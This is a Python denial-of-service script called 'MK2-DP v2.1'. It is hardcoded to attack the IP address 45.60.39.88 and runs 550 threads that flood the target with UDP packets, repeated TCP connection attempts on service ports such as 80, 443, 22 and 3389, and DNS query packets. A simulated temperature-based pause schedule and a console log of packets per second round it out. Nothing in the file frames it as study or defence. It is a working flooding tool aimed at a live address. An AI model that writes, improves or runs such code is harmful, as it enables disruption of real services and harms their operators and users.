import socket
import threading
import time
import random
import gc
from datetime import datetime

# TARGET
TARGET_IP = "45.60.39.88"

# MK2-DP v2.1 CONFIG
UDP_THREADS = 300      # 80% priority
SYN_THREADS = 150      # 20% priority  
DNS_THREADS = 100      # 15% priority
TOTAL_THREADS = 550

# SOCKET POOLS (EFFICIENT)
UDP_POOL_SIZE = 120
SYN_POOL_SIZE = 60

# COOLING THRESHOLDS
COOLING_SCHEDULE = {
    50: 180,    # 50°C = 3 minutes
    60: 420,    # 60°C = 7 minutes
    70: 600,    # 70°C = 10 minutes
    71: 720,    # 70°C+ = 12 minutes
}
TEMP_CHECK_INTERVAL = 1200  # Check every 20 minutes

# Global state
attack_active = True
cooling_active = False
estimated_temp = 45  # Start at 45°C
last_temp_check = time.time()
cooling_end_time = 0

# Stats with efficiency tracking
class EfficientCounter:
    def __init__(self):
        self.value = 0
        self.last_value = 0
        self.peak = 0
        
    def inc(self, amt=1):
        self.value += amt
        if self.value > self.peak:
            self.peak = self.value
            
    def get_pps(self, interval):
        current = self.value
        pps = (current - self.last_value) / interval if interval > 0 else 0
        self.last_value = current
        return int(pps)
    
    def get_total(self):
        return self.value
    
    def reset(self):
        self.value = 0

stats = {
    'total': EfficientCounter(),
    'udp': EfficientCounter(),
    'syn': EfficientCounter(),
    'dns': EfficientCounter(),
}

# Initialize efficient socket pools
udp_pool = []
syn_pool = []

def init_efficient_pools():
    global udp_pool, syn_pool
    
    # UDP Pool - optimized for speed
    udp_pool = []
    for _ in range(UDP_POOL_SIZE):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)  # Larger buffer
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            udp_pool.append(sock)
        except:
            pass
    
    # SYN Pool - optimized for connections
    syn_pool = []
    for _ in range(SYN_POOL_SIZE):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.0005)  # Faster timeout
            syn_pool.append(sock)
        except:
            pass

init_efficient_pools()

# ==================== EFFICIENT ATTACK METHODS ====================
def udp_efficiency_expert(worker_id):
    """80% priority - Maximum efficiency UDP"""
    sock = udp_pool[worker_id % len(udp_pool)]
    port_sequence = 1
    
    while True:
        if not attack_active or cooling_active:
            time.sleep(0.01)  # Minimal sleep during cool
            continue
        
        try:
            # BATCH PROCESSING: 8 packets per cycle
            for batch in range(8):
                # Smart port selection
                if batch < 4:
                    port = random.choice([53, 80, 443, 123])  # Critical ports
                else:
                    port = (port_sequence * 997) % 65535 + 1  # Fast calculation
                    port_sequence += 1
                
                # Optimized payload (64-256 bytes)
                payload_size = 64 if batch % 2 == 0 else 128
                payload = random.randbytes(payload_size)
                
                # ULTRA EFFICIENT SEND
                sock.sendto(payload, (TARGET_IP, port))
                
                # Update stats
                stats['total'].inc()
                stats['udp'].inc()
            
            # 80% PRIORITY: Minimal sleep
            if random.random() < 0.2:  # 20% chance of micro-sleep
                time.sleep(0.0001)
                
        except:
            # Quick recovery
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
                udp_pool[worker_id % len(udp_pool)] = sock
            except:
                pass

def syn_efficiency_expert(worker_id):
    """20% priority - Efficient SYN connections"""
    sock_idx = worker_id % len(syn_pool)
    
    # Pre-defined target ports for efficiency
    target_ports = [80, 443, 22, 53, 3389, 8080, 8443]
    port_index = 0
    
    while True:
        if not attack_active or cooling_active:
            time.sleep(0.02)  # Slightly longer sleep
            continue
        
        try:
            sock = syn_pool[sock_idx]
            port = target_ports[port_index % len(target_ports)]
            port_index += 1
            
            # EFFICIENT CONNECT
            result = sock.connect_ex((TARGET_IP, port))
            
            stats['total'].inc()
            stats['syn'].inc()
            
            if result == 0:
                # Quick close and replace
                sock.close()
                syn_pool[sock_idx] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                syn_pool[sock_idx].settimeout(0.0005)
            
            # 20% PRIORITY: More sleep
            if random.random() < 0.5:
                time.sleep(0.0005)
                
        except:
            # Efficient recovery
            try:
                sock.close()
                syn_pool[sock_idx] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                syn_pool[sock_idx].settimeout(0.0005)
            except:
                pass

def dns_efficiency_expert(worker_id):
    """15% priority - Specialized DNS attacks"""
    sock = udp_pool[(worker_id + UDP_POOL_SIZE//2) % len(udp_pool)]
    
    # DNS payloads (pre-generated for efficiency)
    dns_payloads = [
        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01',
        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04mail\x06google\x03com\x00\x00\x01\x00\x01',
        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x05cloud\x06google\x03com\x00\x00\x01\x00\x01',
    ]
    payload_index = 0
    
    while True:
        if not attack_active or cooling_active:
            time.sleep(0.015)  # Medium sleep
            continue
        
        try:
            # RAPID DNS FIRE
            payload = dns_payloads[payload_index % len(dns_payloads)]
            payload_index += 1
            
            # Send 3 DNS packets per cycle
            for _ in range(3):
                sock.sendto(payload, (TARGET_IP, 53))
                stats['total'].inc()
                stats['dns'].inc()
            
            # 15% PRIORITY: Balanced sleep
            if random.random() < 0.3:
                time.sleep(0.001)
                
        except:
            pass

# ==================== SMART COOLING SYSTEM ====================
def smart_cooling_manager():
    global cooling_active, estimated_temp, cooling_end_time, last_temp_check
    
    while True:
        current_time = time.time()
        
        # Check temperature every 20 minutes
        if current_time - last_temp_check >= TEMP_CHECK_INTERVAL:
            # Simulate temperature estimation based on activity
            base_temp = 45
            activity_factor = min(1.0, stats['total'].get_total() / 1000000)
            estimated_temp = base_temp + (activity_factor * 30)
            
            last_temp_check = current_time
            
            # Determine cooling duration
            cooling_seconds = 0
            for temp_threshold, seconds in sorted(COOLING_SCHEDULE.items()):
                if estimated_temp >= temp_threshold:
                    cooling_seconds = seconds
            
            if cooling_seconds > 0:
                cooling_active = True
                cooling_end_time = current_time + cooling_seconds
                
                # Perform cooling actions
                gc.collect()  # Clean RAM
                
                # Refresh socket pools
                refresh_socket_pools()
                
                print(f"🧊 SMART COOLING: {estimated_temp}°C → {cooling_seconds//60}min")
        
        # Check if cooling should end
        if cooling_active and current_time >= cooling_end_time:
            cooling_active = False
            print("🔥 COOLING COMPLETE: Resuming attack")
        
        time.sleep(1)

def refresh_socket_pools():
    """Refresh 25% of sockets efficiently"""
    # Refresh UDP sockets
    refresh_count = max(1, len(udp_pool) // 4)
    for i in range(refresh_count):
        try:
            udp_pool[i].close()
            udp_pool[i] = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_pool[i].setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
        except:
            pass
    
    # Refresh SYN sockets
    refresh_count = max(1, len(syn_pool) // 4)
    for i in range(refresh_count):
        try:
            syn_pool[i].close()
            syn_pool[i] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            syn_pool[i].settimeout(0.0005)
        except:
            pass

# ==================== DEPLOY EFFICIENT ARMY ====================
def deploy_efficient_army():
    print(f"⚡ DEPLOYING {TOTAL_THREADS} EFFICIENT THREADS")
    
    # UDP Efficiency Experts (300 threads)
    for i in range(UDP_THREADS):
        t = threading.Thread(target=udp_efficiency_expert, args=(i,))
        t.daemon = True
        t.start()
    
    # SYN Efficiency Experts (150 threads)
    for i in range(SYN_THREADS):
        t = threading.Thread(target=syn_efficiency_expert, args=(i,))
        t.daemon = True
        t.start()
    
    # DNS Efficiency Experts (100 threads)
    for i in range(DNS_THREADS):
        t = threading.Thread(target=dns_efficiency_expert, args=(i,))
        t.daemon = True
        t.start()
    
    print(f"✅ {TOTAL_THREADS} THREADS ACTIVE (80/20/15 PRIORITY)")

# ==================== LOGGING SYSTEM ====================
def get_wifi_type():
    """Simulate WiFi type detection"""
    types = ["WiFi1", "WiFi2", "WiFi3", "WiFi4", "WiFi5"]
    # Simple simulation based on time
    hour = datetime.now().hour
    return types[hour % 5]

# Deploy everything
deploy_efficient_army()
threading.Thread(target=smart_cooling_manager, daemon=True).start()

# ==================== MAIN LOGGING LOOP ====================
attack_start = time.time()
last_log_time = time.time()

print("\n" + "="*60)
print("MK2-DP v2.1 - EFFICIENCY MAXIMIZED")
print(f"TARGET: {TARGET_IP}")
print(f"THREADS: {TOTAL_THREADS} (300UDP/150SYN/100DNS)")
print(f"PRIORITY: 80%/20%/15%")
print("="*60 + "\n")

while True:
    time.sleep(5)  # Log every 5 seconds
    current_time = time.time()
    elapsed = current_time - last_log_time
    total_duration = int(current_time - attack_start)
    last_log_time = current_time
    
    # Calculate PPS
    total_pps = stats['total'].get_pps(elapsed)
    udp_pps = stats['udp'].get_pps(elapsed)
    syn_pps = stats['syn'].get_pps(elapsed)
    dns_pps = stats['dns'].get_pps(elapsed)
    
    # Get current timezone
    timezone = time.strftime('%z')
    if not timezone:
        timezone = "GMT+2"  # Default
    
    # WiFi type
    wifi_type = get_wifi_type()
    
    # Format PPS
    if total_pps >= 10000:
        pps_display = f"{total_pps//1000}K PPS"
    else:
        pps_display = f"{total_pps} PPS"
    
    # Status indicator
    if cooling_active:
        status = f"🧊{int(cooling_end_time - current_time)}s"
    else:
        status = f"🔥{total_duration}s"
    
    # Display MK2-DP logging
    print(f"{{SK1-SSALG | GMT{timezone}}}")
    print(f"[{status}] |  | {pps_display} | {wifi_type} | Z$OMBS-{TOTAL_THREADS}")
    
    # Efficiency breakdown (every 30 seconds)
    if total_duration % 30 < 5:
        print(f"   UDP:{udp_pps}/s SYN:{syn_pps}/s DNS:{dns_pps}/s | T:{estimated_temp}°C")
    
    # Cooling status if active
    if cooling_active:
        remaining = int(cooling_end_time - current_time)
        print(f"   🧊 COOLING: {remaining}s remaining | Temp: {estimated_temp}°C")
